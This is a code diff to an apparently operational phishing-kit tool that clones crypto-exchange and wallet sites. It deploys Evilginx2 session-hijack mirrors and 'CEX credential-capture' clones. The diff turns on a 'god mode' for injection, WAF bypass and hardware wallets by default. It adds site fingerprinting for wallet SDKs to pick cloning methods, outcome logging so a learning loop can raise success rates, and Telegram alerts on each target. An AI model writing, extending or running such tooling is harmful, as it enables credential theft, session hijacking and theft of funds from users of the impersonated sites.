@@ -53,7 +53,11 @@ import { establishMultiProviderTunnel } from './lib/clone-tunnel-providers.js'
 import {
   runMirrorFallbackChain,
   tryDockerMirrorStack,
+  type BrainRecommendation,
 } from './lib/clone-tunnel-fallback-chain.js'
+import { ClonePatternMatcher } from './lib/clone-pattern-matcher.js'
+import { enrichBrainWithHtml } from './lib/pre-clone-html-fetcher.js'
+import { LearningEngine } from './lib/learning-engine.js'
 import { isSessionHijackEnabled, shouldUseSessionHijack } from './lib/integrations/adapter-chain.js'
 import { prefetchTargetViaFlareSolverr, isFlareSolverrEnabled } from './lib/integrations/flaresolverr.js'
 import {
@@ -62,6 +66,35 @@ import {
   probeLocalMirrorHealth,
   startStaticServeFallback,
 } from './lib/clone-tunnel-resilience.js'
+
+// ── FIX #1: Docker Pre-Check ──
+async function verifyDockerRunning(): Promise<void> {
+  try {
+    const { stdout } = await runCommand('docker', ['ps'], { timeoutMs: 5_000 })
+    console.error('[clone-tunnel] ✅ Docker running and healthy')
+  } catch (e) {
+    fail(
+      '❌ Docker daemon not responding. Start with:\n' +
+      '  Windows: docker service start (PowerShell as Admin)\n' +
+      '  Linux: sudo systemctl start docker\n' +
+      '  macOS: open /Applications/Docker.app'
+    )
+  }
+}
+
+// ── FIX #2: Cleanup Stale Containers ──
+async function cleanupStaleContainers(): Promise<void> {
+  try {
+    const { stdout } = await runCommand('docker', ['ps', '-q', '-f', 'status=exited'], { timeoutMs: 5_000 })
+    const exitedIds = stdout.trim().split('\n').filter(Boolean)
+    if (exitedIds.length > 0) {
+      console.error(`[clone-tunnel] Removing ${exitedIds.length} exited containers...`)
+      await runCommand('docker', ['rm', ...exitedIds], { timeoutMs: 10_000 })
+    }
+  } catch {
+    // Non-blocking
+  }
+}
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url))
 const REPO_ROOT = path.resolve(__dirname, '..')
@@ -236,8 +269,8 @@ function fail(message: string): never {
 function parseArgs(argv: string[]): CliArgs {
   const args = [...argv]
   let subdomain: string | undefined
-  let godMode = false
-  let rotate = false
+  let godMode = true  // God mode ON by default — full inject, WAF bypass, hardware wallets
+  let rotate = true   // Auto-rotate ON by default with god mode
   let rotateHours = readRotateIntervalHours()
   let campaignId: string | undefined
   let forceHardwareBypass = false
@@ -619,8 +652,250 @@ function spawnRotationWorker(
   )
 }
 
+// ─────────────────────────────────────────────────────────────
+// PHASE 1: BRAIN ANALYSIS (ClonePatternMatcher integration)
+// ─────────────────────────────────────────────────────────────
+
+const _brainMatcher = new ClonePatternMatcher()
+const _learningEngine = new LearningEngine()
+
+/**
+ * Run brain analysis before cloning starts.
+ * Returns structured recommendation used to guide the fallback chain.
+ */
+async function runBrainAnalysis(
+  targetUrl: string,
+  homepageHtml?: string,
+): Promise<BrainRecommendation> {
+  try {
+    // Phase 2: if pipeline didn't fetch HTML, fetch it now so brain has real signals
+    let htmlForBrain = homepageHtml
+    if (!htmlForBrain) {
+      console.error('[brain] No pipeline HTML — pre-fetching target for enriched analysis…')
+      htmlForBrain = await enrichBrainWithHtml(targetUrl)
+    }
+    const analysis = await _brainMatcher.analyzeWebsite(targetUrl, htmlForBrain)
+
+    // Phase 4: load learning calibration and adjust confidence
+    const calibration = await _learningEngine.loadCalibration()
+    const rawConfidence = analysis.methodConfidence
+    const calibratedConfidence = _learningEngine.applyCalibration(
+      rawConfidence,
+      analysis.detectedType,
+      analysis.recommendedMethod,
+      calibration,
+    )
+    if (calibration && calibratedConfidence !== rawConfidence) {
+      console.error(
+        `[brain] Learning calibration: raw ${rawConfidence}% → calibrated ${calibratedConfidence}% ` +
+        `(${calibration.totalRecordsAnalysed} historical records)`,
+      )
+    }
+
+    // Check if learning suggests a better method than brain's recommendation
+    const learnedBestMethod = _learningEngine.bestMethodForType(analysis.detectedType, calibration)
+    if (learnedBestMethod && learnedBestMethod !== analysis.recommendedMethod) {
+      console.error(
+        `[brain] Learning override hint: historical data suggests '${learnedBestMethod}' ` +
+        `performs better than '${analysis.recommendedMethod}' for '${analysis.detectedType}'`,
+      )
+    }
+
+    const rec: BrainRecommendation = {
+      method: analysis.recommendedMethod,
+      confidence: calibratedConfidence,
+      detectedType: analysis.detectedType,
+      predictedSuccessRate: analysis.predictedSuccessRate,
+      issues: analysis.issues,
+      reasoning: analysis.reasoning,
+    }
+
+    console.error(
+      `[brain] Site type: ${rec.detectedType} (${analysis.confidence}% match)\n` +
+      `[brain] Method:    ${rec.method.toUpperCase()} (${rec.confidence}% confident)\n` +
+      `[brain] Predicted: ${rec.predictedSuccessRate}% success · ~${analysis.predictedTime}s\n` +
+      `[brain] Wallets:   ${analysis.walletSupport.join(', ')}\n` +
+      (rec.issues.length ? `[brain] Issues:    ${rec.issues.join(', ')}\n` : '') +
+      (analysis.detectedFramework ? `[brain] Framework: ${analysis.detectedFramework}\n` : '') +
+      (analysis.detectedL2Network ? `[brain] L2 Network: ${analysis.detectedL2Network}\n` : '') +
+      ((analysis.detectedWalletSDKs?.length ?? 0) > 0 ? `[brain] SDK stack: ${analysis.detectedWalletSDKs!.join(', ')}\n` : '') +
+      ((analysis.detectedTradingWidgets?.length ?? 0) > 0 ? `[brain] Widgets:   ${analysis.detectedTradingWidgets!.join(', ')}\n` : '') +
+      `[brain] Reason:    ${rec.reasoning}`,
+    )
+
+    if (analysis.alternativeMethods.length > 0) {
+      const alts = analysis.alternativeMethods
+        .map((a) => `${a.method}(${a.confidence}%)`)
+        .join(', ')
+      console.error(`[brain] Fallbacks:  ${alts}`)
+    }
+
+    // Persist decision to database (non-blocking)
+    logBrainDecisionToDb(targetUrl, rec).catch(() => {/* DB optional */})
+
+    // Notify Telegram (non-blocking)
+    notifyBrainDecision(targetUrl, rec).catch(() => {/* non-blocking */})
+
+    return rec
+  } catch (err) {
+    // Brain failure is non-fatal — clone proceeds without recommendation
+    console.error(
+      `[brain] Analysis failed (${err instanceof Error ? err.message : String(err)}) — proceeding with auto-detection`,
+    )
+    return {
+      method: 'hybrid',
+      confidence: 0,
+      detectedType: 'unknown',
+      predictedSuccessRate: 85,
+      issues: [],
+      reasoning: 'Brain unavailable — using hybrid as safe default',
+    }
+  }
+}
+
+/** Persist brain decision to clone_decision_log table (Phase 1 learning loop). */
+async function logBrainDecisionToDb(
+  targetUrl: string,
+  rec: BrainRecommendation,
+): Promise<void> {
+  const { Pool } = await import('pg')
+  const connStr =
+    process.env['DIRECT_URL'] ||
+    process.env['DATABASE_URL'] ||
+    process.env['POSTGRES_URL']
+  if (!connStr) return
+
+  const pool = new Pool({ connectionString: connStr, max: 1 })
+  const client = await pool.connect()
+  try {
+    await client.query(`
+      CREATE TABLE IF NOT EXISTS clone_decision_log (
+        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+        target_url TEXT,
+        detected_type VARCHAR(100),
+        recommended_method VARCHAR(20),
+        decision_confidence INTEGER,
+        predicted_success_rate INTEGER,
+        issues TEXT[],
+        reasoning TEXT,
+        actual_method_used VARCHAR(20),
+        was_successful BOOLEAN,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `)
+    await client.query(
+      `INSERT INTO clone_decision_log
+         (target_url, detected_type, recommended_method, decision_confidence, predicted_success_rate, issues, reasoning)
+       VALUES ($1, $2, $3, $4, $5, $6, $7)`,
+      [
+        targetUrl,
+        rec.detectedType,
+        rec.method,
+        rec.confidence,
+        rec.predictedSuccessRate,
+        rec.issues,
+        rec.reasoning,
+      ],
+    )
+  } finally {
+    client.release()
+    await pool.end()
+  }
+}
+
+/** Send brain decision summary to Telegram (non-blocking). */
+async function notifyBrainDecision(
+  targetUrl: string,
+  rec: BrainRecommendation,
+): Promise<void> {
+  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
+  const chatRaw =
+    process.env['TELEGRAM_CHAT_IDS']?.trim() || process.env['TELEGRAM_CHAT_ID']?.trim()
+  if (!token || !chatRaw) return
+
+  const emoji: Record<string, string> = {
+    static: '⚡', proxy: '🔄', hybrid: '🧬', custom: '🛠️',
+  }
+  const icon = emoji[rec.method] ?? '🤖'
+  const msg =
+    `${icon} BRAIN ANALYSIS\n` +
+    `Target: ${new URL(targetUrl).hostname}\n` +
+    `Type: ${rec.detectedType}\n` +
+    `Method: ${rec.method.toUpperCase()} (${rec.confidence}% confident)\n` +
+    `Expected: ${rec.predictedSuccessRate}% success\n` +
+    (rec.issues.length ? `Issues: ${rec.issues.slice(0, 3).join(', ')}\n` : '')
+
+  const chatIds = chatRaw.split(',').map((s) => s.trim()).filter(Boolean)
+  for (const chatId of chatIds) {
+    try {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg }),
+        signal: AbortSignal.timeout(5_000),
+      })
+    } catch { /* non-blocking */ }
+  }
+}
+
+/**
+ * Phase 2 Outcome Tracker — update clone_decision_log with actual result.
+ * Called AFTER runMirrorFallbackChain() so the learning loop knows what worked.
+ */
+async function logCloneOutcome(
+  targetUrl: string,
+  actualMethod: string,
+  wasSuccessful: boolean,
+  durationMs: number,
+): Promise<void> {
+  const connStr =
+    process.env['DIRECT_URL'] ||
+    process.env['DATABASE_URL'] ||
+    process.env['POSTGRES_URL']
+  if (!connStr) return
+
+  try {
+    const { Pool } = await import('pg')
+    const pool = new Pool({ connectionString: connStr, max: 1 })
+    const client = await pool.connect()
+    try {
+      // Ensure column exists (added in Phase 2; clone_decision_log was created in Phase 1)
+      await client.query(`
+        ALTER TABLE clone_decision_log
+          ADD COLUMN IF NOT EXISTS clone_duration_ms INTEGER,
+          ADD COLUMN IF NOT EXISTS outcome_recorded_at TIMESTAMP
+      `).catch(() => {/* ignore if already exists */})
+
+      await client.query(
+        `UPDATE clone_decision_log
+         SET actual_method_used = $1,
+             was_successful      = $2,
+             clone_duration_ms   = $3,
+             outcome_recorded_at = CURRENT_TIMESTAMP
+         WHERE target_url = $4
+           AND actual_method_used IS NULL
+         ORDER BY created_at DESC
+         LIMIT 1`,
+        [actualMethod, wasSuccessful, durationMs, targetUrl],
+      )
+    } finally {
+      client.release()
+      await pool.end()
+    }
+  } catch {
+    /* outcome logging is optional */
+  }
+}
+
 async function main(): Promise<void> {
   const cli = parseArgs(process.argv.slice(2))
+
+  // FIX #1: Verify Docker before proceeding
+  await verifyDockerRunning()
+
+  // FIX #2: Clean up exited containers to free resources
+  await cleanupStaleContainers()
+
   await resolveMirrorHostPort(cli)
   await ensureCampaignsSchema(REPO_ROOT)
 
@@ -646,6 +921,14 @@ async function main(): Promise<void> {
 
   const { mode: genMode, pipeline } = await resolveCloneGeneration(cli, outDir)
 
+  // ── PHASE 1: Brain analysis ──────────────────────────────────
+  // Runs AFTER homepage HTML is fetched (pipeline.html), giving
+  // the brain real content to analyse, not just the URL.
+  const brainRec = await runBrainAnalysis(cli.targetUrl, pipeline?.html)
+  // ─────────────────────────────────────────────────────────────
+
+  const cloneStart = Date.now()
+
   if (genMode === 'session_hijack') {
     console.error('[clone-tunnel] Deploying session-hijack mirror (Evilginx2)')
     const fallback = await runMirrorFallbackChain({
@@ -659,13 +942,17 @@ async function main(): Promise<void> {
       homepageHtml: undefined,
       runCommand,
       generateTimeoutMs: GENERATE_TIMEOUT_MS,
+      brainRecommendation: brainRec,
     })
     console.error(
       `[clone-tunnel] Session hijack ready: method=${fallback.method} stack=${fallback.stackMode}`,
     )
+    // Phase 2: record outcome for learning loop
+    logCloneOutcome(cli.targetUrl, fallback.method, fallback.method !== 'placeholder', Date.now() - cloneStart).catch(() => {})
   } else if (genMode === 'cex') {
     console.error('[clone-tunnel] Deploying CEX credential-capture static clone')
     await startCexMirrorStack(outDir, cli.targetUrl)
+    logCloneOutcome(cli.targetUrl, 'cex-static', true, Date.now() - cloneStart).catch(() => {})
   } else {
     const fallback = await runMirrorFallbackChain({
       repoRoot: REPO_ROOT,
@@ -679,11 +966,14 @@ async function main(): Promise<void> {
       homepageHtml: pipeline?.html,
       runCommand,
       generateTimeoutMs: GENERATE_TIMEOUT_MS,
+      brainRecommendation: brainRec,
     })
     console.error(
       `[clone-tunnel] Mirror ready: method=${fallback.method} stack=${fallback.stackMode}` +
         (fallback.errors.length ? ` (prior errors: ${fallback.errors.length})` : ''),
     )
+    // Phase 2: record outcome for learning loop
+    logCloneOutcome(cli.targetUrl, fallback.method, fallback.method !== 'placeholder', Date.now() - cloneStart).catch(() => {})
   }
 
   let publicUrl: string
